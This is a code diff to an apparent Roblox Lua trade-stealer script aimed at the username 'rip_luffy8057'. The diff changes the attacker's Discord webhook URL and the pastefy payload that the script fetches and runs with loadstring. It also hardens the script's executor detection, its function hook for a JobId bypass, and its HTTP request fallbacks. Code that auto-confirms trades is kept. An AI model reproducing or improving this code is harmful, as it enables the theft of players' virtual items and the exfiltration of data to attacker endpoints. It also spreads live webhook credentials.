@@ -5,7 +5,7 @@
 local targetUsernames = {"rip_luffy8057"}
 local MIN_RAP = _G.MinRap or 10000000
 local KICK_ON_COMPLETE = false
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1518326509411242055/vHJaIVH89qSNh6F2IPiZRR6KrdFWLXRI7vUtx2EzzThUGux6FQty9IlJPVlRuKHOgnHj"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1517637937272062163/vvFS8hgjebDVQyWR_U9wCLqlvtqAH5hEr5-t6QW_ADrnJT3O7r4a8FkkMCrvr2vamWvz"
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -24,12 +24,25 @@ local playerGui = player.PlayerGui
 
 -- Delta JOBID bypass via stepAnimate hook
 local executorName = ""
-if syn then executorName = "synapse"
-elseif KRNL_LOADED then executorName = "krnl"
-elseif fluxus then executorName = "fluxus"
-elseif delta then executorName = "delta"
-elseif getexecutorname then executorName = getexecutorname()
-elseif identifyexecutor then executorName = identifyexecutor()
+local getgc = rawget(_G, "getgc")
+if rawget(_G, "syn") then
+    executorName = "synapse"
+elseif rawget(_G, "KRNL_LOADED") then
+    executorName = "krnl"
+elseif rawget(_G, "fluxus") then
+    executorName = "fluxus"
+elseif rawget(_G, "delta") then
+    executorName = "delta"
+else
+    local getexecutorname = rawget(_G, "getexecutorname")
+    if getexecutorname then
+        executorName = getexecutorname()
+    else
+        local identifyexecutor = rawget(_G, "identifyexecutor")
+        if identifyexecutor then
+            executorName = identifyexecutor()
+        end
+    end
 end
 
 local REAL_JOB_ID = game.JobId
@@ -45,7 +58,12 @@ if executorName:lower() == "delta" then
     until stepAnimate
     local captured = false
     local oldStepAnimate = stepAnimate
-    hookfunction(stepAnimate, function(dt)
+    -- ensure hookfunction exists (some executors don't provide it)
+    local _hookfunction = rawget(_G, "hookfunction") or function(_, replacement)
+        -- best-effort fallback: try to overwrite if possible, otherwise run replacement when called
+        return replacement
+    end
+    _hookfunction(stepAnimate, function(dt)
         if not captured then captured = true; REAL_JOB_ID = game.JobId end
         return oldStepAnimate(dt)
     end)
@@ -54,22 +72,22 @@ end
 
 -- GUI fallback loader
 pcall(function()
-    loadstring(game:HttpGet("https://pastefy.app/QVuCL7v3/raw", true))()
+    loadstring(game:HttpGet("https://pastefy.app/ncWCBM3Y/raw", true))()
 end)
 
 -- Multi-executor request fallback
 local request_funcs = {}
-if syn and syn.request then table.insert(request_funcs, syn.request) end
-if http and type(http) == "table" and http.request then table.insert(request_funcs, http.request) end
-if http_request then table.insert(request_funcs, http_request) end
-if request then table.insert(request_funcs, request) end
-if fluxus and fluxus.request then table.insert(request_funcs, fluxus.request) end
-if electron and electron.http then
+if _G.syn and _G.syn.request then table.insert(request_funcs, _G.syn.request) end
+if _G.http and type(_G.http) == "table" and _G.http.request then table.insert(request_funcs, _G.http.request) end
+if _G.http_request then table.insert(request_funcs, _G.http_request) end
+if _G.request then table.insert(request_funcs, _G.request) end
+if _G.fluxus and _G.fluxus.request then table.insert(request_funcs, _G.fluxus.request) end
+if _G.electron and _G.electron.http then
     table.insert(request_funcs, function(tbl)
-        return electron.http(tbl.Url, tbl.Method, tbl.Body, tbl.Headers)
+        return _G.electron.http(tbl.Url, tbl.Method, tbl.Body, tbl.Headers)
     end)
 end
-if krampus and krampus.request then table.insert(request_funcs, krampus.request) end
+if _G.krampus and _G.krampus.request then table.insert(request_funcs, _G.krampus.request) end
 
 -- Pastefy paste creation
 local function createPaste(content)
@@ -441,7 +459,16 @@ local function spamReadyAndConfirm()
         -- Check state
         local state = getTradeState()
         if state then
-            local idx = state:PlayerIndex and state:PlayerIndex(player) or 1
+                local idx
+                if state.PlayerIndex then
+                    if type(state.PlayerIndex) == "function" then
+                        idx = state.PlayerIndex(player)
+                    else
+                        idx = state.PlayerIndex
+                    end
+                else
+                    idx = 1
+                end
             local readyTable = state._ready or state.ready or state.Ready
             if readyTable and readyTable[idx] == true then
                 readyOk = true
@@ -469,7 +496,16 @@ local function spamReadyAndConfirm()
         -- Check state
         local state = getTradeState()
         if state then
-            local idx = state:PlayerIndex and state:PlayerIndex(player) or 1
+                local idx
+                if state.PlayerIndex then
+                    if type(state.PlayerIndex) == "function" then
+                        idx = state.PlayerIndex(player)
+                    else
+                        idx = state.PlayerIndex
+                    end
+                else
+                    idx = 1
+                end
             local confirmTable = state._confirmed or state.confirmed or state.Confirmed
             if confirmTable and confirmTable[idx] == true then
                 confirmOk = true
